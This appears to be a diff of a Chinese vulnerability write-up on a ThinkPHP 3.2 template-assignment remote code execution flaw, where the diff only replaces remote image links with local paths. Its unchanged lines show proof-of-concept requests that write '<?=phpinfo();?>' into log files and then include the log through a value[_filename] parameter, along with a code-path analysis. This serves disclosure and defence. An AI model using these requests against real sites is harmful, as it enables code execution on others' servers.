@@ -56,7 +56,7 @@ schema_version: "1"
 
 近日，默安玄甲实验室发现网络上出现针对 ThinkPHP3.2 的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法 assign 的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbn9zeBezXian90XV2ibFgZUwxUyfmKbLJqcfokPNlUG5Hdibrp3IdmxhHQ/640?wx_fmt=png)
+![](../../.resource/remote/b3d36b460443167641da1ffc616a92dc40e3d26c8b1703ce332fc04a4d0bdf26.png)
 
 ThinkPHP 是一个开源免费的，快速、简单的面向对象的轻量级 PHP 开发框架，是为了敏捷 WEB 应用开发和简化企业应用开发而诞生的。Thinkphp 在国内拥有庞大的用户群体，其中不乏关键基础设施用户。
 
@@ -74,7 +74,7 @@ ThinkPHP 是一个开源免费的，快速、简单的面向对象的轻量级 P
 > 
 >   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbicicSlHibgrD1Qadib4eCQjR8PoiaMUPgX4ERwOURpBNP2YHUYfqTfpiaxSA/640?wx_fmt=png)
+![](../../.resource/remote/2e9e6b369be4ca5a5752b3c1be8a2ea171bb02838433da22988cf7d336a6fc0f.png)
 
   
 
@@ -84,7 +84,7 @@ ThinkPHP 是一个开源免费的，快速、简单的面向对象的轻量级 P
 > 
 >   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbtP0T5hsvD3pOVN4fiaEJS5RDoibycibEQaj4NUGeKnAC3pJBpDiajGvDoQ/640?wx_fmt=png)
+![](../../.resource/remote/331cbe89550cf8d0aad078b58bb0e8bad1332454cb6cc1cf46d582945312795b.png)
 
   
 
@@ -94,7 +94,7 @@ ThinkPHP 是一个开源免费的，快速、简单的面向对象的轻量级 P
 
 目前 Github 最新数据显示全部仓库内共有 331 个，相关代码行数 244,863 个。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbGianIfouV2Ex6Ae4lUqMqrtKvg9ibwzXpSkT5W1CpqC9xskwryX0BpIQ/640?wx_fmt=png)
+![](../../.resource/remote/14b9e86f1a743ce2550dcc977f03912b332ba084fba5148ebec6a7a286458dc8.png)
 
   
 
@@ -129,7 +129,7 @@ ThinkPHP 是一个开源免费的，快速、简单的面向对象的轻量级 P
 
 下面是漏洞的 demo 代码：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbFCNibib54s7gttrZrLeiaMVYd0ib1ibjNdtFDiaAp72nDUUkkBQCtZLZibFyw/640?wx_fmt=png)
+![](../../.resource/remote/7bb174b4072f6351f861c69a6e3b908074203540965aa70b2bd5f97102e6ded7.png)
 
 ```
 <?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller {    public function index($value=''){        $this->assign($value);        $this->display();    \}\}
@@ -163,7 +163,7 @@ debug 模式开启或不开启有一点区别，但是都可以。
 
 写入攻击代码到日志中。错误请求系统报错：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbGvWa3RjeibDqDQjzCe9GxekWSVUFZ2OFibnuK7RyJaEzw98tX6hG4c3w/640?wx_fmt=png)
+![](../../.resource/remote/de6564818c7f0b6c424f25ecea9204659cf998304f52a7d06ec4ac75dbe5b2a2.png)
 
   
 
@@ -181,14 +181,14 @@ GET /index.php?m=--><?=phpinfo();?> HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5
 
 日志文件内容：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbasyPS1E03qGQFOM2iaTXaTWqv9WdyjDZGx2ERNaJ8Nd3gRHfyK1M1sQ/640?wx_fmt=png)
+![](../../.resource/remote/bbc65e378a5f2c685d397d4b7af6ed82d412cf544dd29f5631c7228c63479f3b.png)
 
 > 构造攻击请求：  
 > http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_06_30.log
 > 
 >   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbf20QnBwacGI7769PSguBnGKakibJriaOplpMXoIkcY4hoFWZrcU7zuXg/640?wx_fmt=png)
+![](../../.resource/remote/970a5af15ea919afdee7672e106dc5135a1cb1ab365335abbd80a2dabdaee38a.png)
 
 > 2.debug 模式开启：
 > 
@@ -214,7 +214,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 > 
 >   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxb8gkgUiaFnqnbpCDv4Tib6VeoNAh0CmYleLOZmn9lpQ0vrdxMDIWafA4A/640?wx_fmt=png)
+![](../../.resource/remote/65968f570a6210aa513ef1535692e08af8f8da505dc365e32870ef0e87dc7c1b.png)
 
 > 3. 寻找程序上传入口，上传文件
 > 
@@ -230,13 +230,13 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 程序执行流程：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbqHDOa2w687LG9Bh9k767ibVGUlEzSX9wdmPKpWJxSo0fBNlrEiahgaog/640?wx_fmt=png)
+![](../../.resource/remote/5ce626a1092914ccc5af065693a13a572be4ec80a814d38ba7d131bbbde5bf76.png)
 
 1. 功能代码中的 assign 方法中第一个变量为可控变量：
 
 **代码位置：\Application\Home\Controller\IndexController.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxb82l1UMs5pibeOv04kcffKDAzZxMwGus4QK9Shz1Gic6icA4npnXH1fmnA/640?wx_fmt=png)
+![](../../.resource/remote/6080d102ea6e0cb77c210a0367b3ce67fdd86fd132c8e049cae91ce8770be08e.png)
 
   
 
@@ -244,13 +244,13 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Think\View.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbE8GQCgbMurLSkWBynIwDiczAakeuqUDh1dHB5fcjINqnYxbibFT8OCog/640?wx_fmt=png)
+![](../../.resource/remote/c61912c84b4c47af5b4343e932a3c5eb6a364e2f99c6e5ee7d0e8496f383cedb.png)
 
 3. 赋值结束后进入 display 方法中，display 方法开始解析并获取模板文件内容，此时模板文件路径和内容为空：
 
 **代码位置：\ThinkPHP\Library\Think\View.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbE7gtnO4gWsR8xbhdD5xbvuLEYnjJF0a9VChBvHQjsCmqP6zWjasic3w/640?wx_fmt=png)
+![](../../.resource/remote/db3f1afae2ee8122a12996f56ae1d01a703af1bfd116640467274d449915ffb3.png)
 
   
 
@@ -258,7 +258,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Think\View.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbC4nRWMCPXeDUgvXQDAq6ibicO1XXugicVq0PibTLqibUKILgFR8cPibziaszQ/640?wx_fmt=png)
+![](../../.resource/remote/c79fdbbf5104dbbcebaa1196e91e8297fa3a142790505d67ec76c7f461b812d6.png)
 
   
 
@@ -266,7 +266,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Think\Hook.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbibEw3Mv9nHymdDib4aWavicqcaulFTbeFGxtEghkexARia9S0sruj3wiaKQ/640?wx_fmt=png)
+![](../../.resource/remote/e83c85286a70564f7027bdb283f84ad0e1fde41e4900281a70a38984eb88502f.png)
 
   
 
@@ -274,7 +274,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Think\Hook.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbAkB95dS5buchonZCm876kpZ1HdtNpIoUmZsMOlCwtcguc9CBbk7YsQ/640?wx_fmt=png)
+![](../../.resource/remote/8349972db549a2509dd2805940e1694d82c0a8cc3cda5bbcd568dd947461694a.png)
 
   
 
@@ -282,7 +282,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Behavior\ParseTemplateBehavior.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbSlV5uaxw7uib30X8LYX0ibjmvTeXxY7omyVQzRsQ5a2lk5ghGvG43XCQ/640?wx_fmt=png)
+![](../../.resource/remote/0950ee9efba914a178a7740b28900466373f4de5fb2f710efb4af086aa09732b.png)
 
   
 
@@ -290,7 +290,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Think\Template.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxb7EDEEZRYOwJL4Oia0TFy127ySNaWbXvlVGzxEEAFScaiaC5FticWPYQ5Q/640?wx_fmt=png)
+![](../../.resource/remote/c39797501d020d6ee404546f8fa2dc9030c40a5e525211d53f8da5306778bcc5.png)
 
   
 
@@ -298,13 +298,13 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 
 **代码位置：\ThinkPHP\Library\Think\Storage\Driver\File.class.php**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbCRficVWyPbRuASmRx4ib3VWWA9WAlIyBbfmAv7UcsP3w6U8UHdAD2kvg/640?wx_fmt=png)
+![](../../.resource/remote/9701402e22b74c9200472beaff547b190d3aaf00f4a490b6db6d410f584de3c3.png)
 
   
 
 覆写后：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbwINkmzDn57URpPTX7dmm6fb18UNjiaOCk9wT5Qlw4FzvpgPoKcn898g/640?wx_fmt=png)
+![](../../.resource/remote/d8c57f97679acefc9ffc1482c8b759045b3bd7a77c30d1a83c926b3bb983c039.png)
 
   
 
@@ -315,7 +315,7 @@ GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.
 > 
 >   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/50Hiagic8dst7PQ1icLB0RagTzUu2s7GCxbYjVKWV3MjwLd8xqeE5NchrGnXjGYFKdovx8xCusibdhZ8Eb2sqZoicMw/640?wx_fmt=png)
+![](../../.resource/remote/f33d43002d21a75d4aec11aaee387c24a966c12038008050ec05410ff419691a.png)
 
   
 
